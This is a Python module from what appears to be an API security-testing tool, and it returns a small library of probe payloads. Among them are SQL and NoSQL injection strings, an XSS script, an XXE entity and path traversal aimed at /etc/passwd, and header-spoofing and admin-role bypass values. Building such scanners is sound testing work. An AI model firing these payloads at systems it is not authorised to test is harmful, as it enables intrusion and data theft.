"""
OverApi Payload Library
Comprehensive collection of security testing payloads
"""

from typing import Dict, List

# Import enterprise payloads
try:
    from .enterprise_payloads import EnterprisePayloads
    ENTERPRISE_AVAILABLE = True
except ImportError:
    ENTERPRISE_AVAILABLE = False


def get_payloads() -> Dict[str, List[str]]:
    """
    Get all payloads for security testing

    Returns:
        Dictionary of payload categories and their payloads
    """
    # Legacy payloads for backward compatibility
    legacy_payloads = {
        'generic': [
            "../",
            "%00",
            "%2e%2e%2f",
            "{\"test\":1}",
            "' OR '1'='1",
            "\"><script>alert(1)</script>",
            "../../../../etc/passwd",
        ],
        'rest': [
            "Content-Type: application/json;charset=UTF-7",
        ],
        'graphql': [
            "{\"query\":\"{__schema{types{name}}}\"}",
        ],
        'xml': [
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY y SYSTEM \"file:///etc/passwd\">]><x>&y;</x>",
        ],
        'bypass': [
             "X-Forwarded-For: 127.0.0.1",
             "X-Originating-IP: 127.0.0.1",
             "{\"role\":\"admin\"}",
             "{\"$ne\":\"\"}"
        ]
    }

    # If enterprise payloads available, use them
    if ENTERPRISE_AVAILABLE:
        enterprise_payloads = EnterprisePayloads.get_all_payloads()
        # Merge with legacy for compatibility
        legacy_payloads.update(enterprise_payloads)

    return legacy_payloads


def get_payload_count() -> int:
    """Get total count of available payloads"""
    if ENTERPRISE_AVAILABLE:
        return EnterprisePayloads.get_payload_count()
    else:
        payloads = get_payloads()
        return sum(len(p) for p in payloads.values() if isinstance(p, list))


__all__ = ['get_payloads', 'get_payload_count']
